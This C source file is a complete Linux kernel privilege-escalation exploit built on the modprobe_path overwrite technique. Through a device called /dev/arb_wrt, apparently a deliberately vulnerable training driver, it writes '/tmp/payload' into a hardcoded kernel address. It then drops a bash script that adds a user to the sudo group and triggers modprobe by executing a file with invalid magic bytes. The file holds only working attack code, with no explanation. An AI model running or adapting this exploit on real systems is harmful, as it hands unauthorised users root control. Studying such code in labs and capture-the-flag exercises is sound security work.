#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>

int arb_wrt_fd;

void create_payload(char *payload_path) {
    int fd;
    if ((fd = open(payload_path, O_WRONLY | O_CREAT, 0777)) == -1) {
        perror("open");
        exit(1);
    }

    if (dprintf(fd, "#!/bin/bash\nusermod -G sudo my_user\n") < 0) {
        perror("dprintf");
        exit(1);
    }

    if (close(fd) == -1) {
        perror("close");
        exit(1);
    }
}


void create_broken_file(char *broken_file_path) {
    int fd;
    if ((fd = open(broken_file_path, O_WRONLY | O_CREAT, 0777)) == -1) {
        perror("open");
        exit(1);
    }

    char buf[] = {0x01, 0x02, 0x03 ,0x04};

    if (write(fd, buf, sizeof(buf)) == -1) {
        perror("write");
        exit(1);
    }

    if (close(fd) == -1) {
        perror("close");
        exit(1);
    }
}


void prepare_arbitrary_writes() {
    if ((arb_wrt_fd = open("/dev/arb_wrt", O_WRONLY)) == -1) {
        perror("open");
        exit(1);
    }
}


void arbitrary_write(void *address, const void *content, size_t length) {
    if (ioctl(arb_wrt_fd, 0x1337, address) != 0) {
        perror("write");
        exit(1);
    }


    if (write(arb_wrt_fd, content, length) == -1) {
        perror("write");
        exit(1);
    }
}


void release_arbitrary_writes() {
    if (close(arb_wrt_fd) == -1) {
        perror("close");
        exit(1);
    }
}


void trigger_modprobe(char *broken_file_path) {
    system(broken_file_path);
}


int main(int argc, char *argv[]) {

    prepare_arbitrary_writes();

    void *modprobe_path_addr = (void*) 0xffffffffaa48b940;
    char *new_modprobe_path = "/tmp/payload";
    arbitrary_write(modprobe_path_addr, new_modprobe_path, strlen(new_modprobe_path) + 1);

    release_arbitrary_writes();

    create_payload(new_modprobe_path);

    char *broken_file_path = "/tmp/broken_file";
    create_broken_file(broken_file_path);

    trigger_modprobe(broken_file_path);

    return 0;
}